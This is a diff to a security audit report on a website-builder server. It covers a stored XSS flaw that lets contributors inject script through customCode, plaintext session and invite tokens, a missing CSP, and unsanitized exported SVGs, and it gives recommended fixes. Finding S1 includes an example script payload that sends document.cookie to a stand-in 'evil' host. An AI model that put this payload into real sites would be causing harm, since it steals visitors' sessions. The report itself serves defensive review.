@@ -17,11 +17,11 @@ No autonomous code change. The sole CRITICAL/HIGH finding (S1) requires altering
 ## CRITICAL / HIGH
 
 ### S1 — Contributor → stored XSS on the published origin (HIGH; CRITICAL if contributors are untrusted)
-**`server/index.mjs:340` + `server/export.mjs:464,506-509`.** `handleStore` gates writes with only `if (!sessionUser(req))` — any authenticated user, **including a `contributor`**, can `PUT /api/store/superbird-project:main` with an arbitrary body. The stored project includes `settings.customCode.head/body` and per-page `customCode`, which the exporter emits **verbatim** into `<head>`/as `<script>` on publish. A content-only contributor can therefore plant `settings.customCode.head = "<script>fetch('//evil/?c='+document.cookie)</script>"`; the next publish by an editor/admin ships it to every visitor. The same write can overwrite `settings.smtp` or corrupt the whole project blob.
+**`server/index.mjs:340` + `server/export.mjs:464,506-509`.** `handleStore` gates writes with only `if (!sessionUser(req))` — any authenticated user, **including a `contributor`**, can `PUT /api/store/superbird-project:main` with an arbitrary body. The stored project includes `settings.customCode.head/body` and per-page `customCode`, which the exporter emits **verbatim** into `<head>`/as `<script>` on publish. A preview-only contributor can therefore plant `settings.customCode.head = "<script>fetch('//evil/?c='+document.cookie)</script>"`; the next publish by an editor/admin ships it to every visitor. The same write can overwrite `settings.smtp` or corrupt the whole project blob.
 
 CLAUDE.md:86 documents the *structural* contributor restriction as "UI-enforced only … intentional gap." Code-injection via `customCode` and credential overwrite via `smtp` plausibly exceed that intent — but closing it changes the auth model, so it is escalated rather than patched here.
 
-**Recommended fix (QUESTIONS.md item 14):** on a contributor `PUT` to a project key, load the current stored value and reject (403) if `settings.customCode`, any page `customCode`, or `settings.smtp` would change. Contributors never legitimately edit those fields (ContentView has no code/settings surface), so the guard rejects only anomalous writes. Needs contributor-autosave verification before shipping.
+**Recommended fix (QUESTIONS.md item 14):** on a contributor `PUT` to a project key, load the current stored value and reject (403) if `settings.customCode`, any page `customCode`, or `settings.smtp` would change. Contributors never legitimately edit those fields (PreviewView has no code/settings surface), so the guard rejects only anomalous writes. Needs contributor-autosave verification before shipping.
 
 ---
 
@@ -31,7 +31,7 @@ CLAUDE.md:86 documents the *structural* contributor restriction as "UI-enforced 
 - **S3 — Session tokens stored in plaintext at rest** (`server/auth.mjs:183-188` → `sessions.json`). A leaked data dir hands over every live session. Fix: key the session map by `sha256(token)`, hash on lookup; raw token stays only in the cookie. (Safe, self-contained — a good first human fix.)
 - **S4 — Invite raw token stored at rest** (`server/auth.mjs:294,297`) contradicts the file's own "stored ONLY as sha256" comment. Leaked `invites.json` → accept any pending invite at its role. Fix: drop the raw `token` field; use the existing regenerate flow to re-issue links.
 - **S5 — No CSP on exported site or admin SPA** (`server/index.mjs:433` sends only `nosniff`). With S1, there is no containment layer on the public origin. Fix: emit a CSP for exported pages + admin shell (must accommodate owner `customCode` — nonces or documented `unsafe-inline`).
-- **S6 — Exported SVG relies on a host CSP the export doesn't emit** (`server/export-media.mjs:110`, upload scrub `server/media.mjs:178`). SVGs are copied verbatim into `media/<hash>.svg`; `/media/...` is `SAFE_HREF`-linkable, so an SVG slipping past the regex scrubber executes on direct navigation without the serving-time CSP. Fix: re-run/upgrade SVG sanitization at export, or emit CSP for the static site.
+- **S6 — Exported SVG relies on a host CSP the export doesn't emit** (`server/export-media.mjs:110`, upload scrub `server/media.mjs:178`). SVGs are copied verbatim into `assets/media/<hash>.svg`; the exported media path is `SAFE_HREF`-linkable, so an SVG slipping past the regex scrubber executes on direct navigation without the serving-time CSP. Fix: re-run/upgrade SVG sanitization at export, or emit CSP for the static site.
 
 ## LOW (triage — left in place)
 
